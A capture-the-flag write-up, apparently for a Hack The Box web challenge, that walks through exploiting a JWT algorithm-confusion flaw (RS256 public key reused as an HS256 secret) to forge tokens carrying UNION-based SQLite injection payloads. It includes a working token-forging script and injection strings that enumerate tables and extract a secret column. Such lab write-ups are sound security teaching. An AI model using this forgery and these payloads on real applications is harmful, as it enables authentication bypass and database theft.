# Under Construction

## Keynotes

* JWT structure
* Manual SQL Injection

## Tracking

1. Downloaded the code and looked through it

2. Observed that SQL injection is possible in the 'get' DBHelper script because the username is inserted directly, without prepared statements

3. Tried to bypass this for a while by computing SQL injections and register them as usernames, but found out that, somehow, it doesn't work

4. Replicated the environment locally and tried to see what happens with the username

5. Observed that the reason why the injection doesn't work is because, before the JWT used for authentication is composed, the ' characters in the username are duplicated before being written into the JWT payload - thus, when accessing a protected route, the injection will be escaped in the 'get' method in DBHelper

6. After login, the JWT is accessible in a cookie - I analyzed it and observed that, besides the username, it also contains a public key - probably the pair of the private key that was used on signing

6. Based on that and on some small hints from HTB forum, I started investigating how the JWTs are generated and observed that, though they are generated only with RS256, thus signed with a private key and verified with a public key, the 'decode' method, which actually verifies the validity of the JWT, also accepted HS256

7. Unlike RS256, HS256 uses one secret key for both signing and verifying - thus, using the public key that I just got from the JWT itself, I figured out that I can create my own legit JWT

8. Created a small js script to do that, reusing methods from the downloaded source

```js
const fs = require('fs');

// the public key extracted from a legit JWT
const publicKey = fs.readFileSync('./public.key', 'utf8');

const jwt = require('jsonwebtoken');

async function sign(data) {
    data = Object.assign(data, { pk: publicKey });

    const result = await jwt.sign(data, publicKey, { algorithm: 'HS256' });

    console.log(result);
}
```

10. Then, I started to think again about SQL injections and, embedding it in the JWT as username, I observed that, this time, I was able to execute injections.

```
sign({username: "x\' UNION SELECT id, password, username FROM users LIMIT 1 OFFSET 0;"});
```

11. I started looking up on the internet on how to create injections for SQLite, and, after a couple of tries, I've come up with some working injections

12. First I found the `flag_storage` table

```
sign({username: "x\' UNION SELECT 1, name, 3 FROM sqlite_master WHERE type \'table\' AND name NOT LIKE \'sqlite_%\' LIMIT 1 OFFSET 0;"});
```

13. Then I found the `top_secret_flaag` column inside it

```
sign({username: "x\' UNION SELECT 1, name, 2 FROM PRAGMA_TABLE_INFO(\'flag_storage\') LIMIT 1 OFFSET 1;"});
```

14. Extracted the flag from the db

```
sign({username: "x\' UNION SELECT 1, top_secret_flaag, 3 FROM flag_storage LIMIT 1 OFFSET 0;"});
```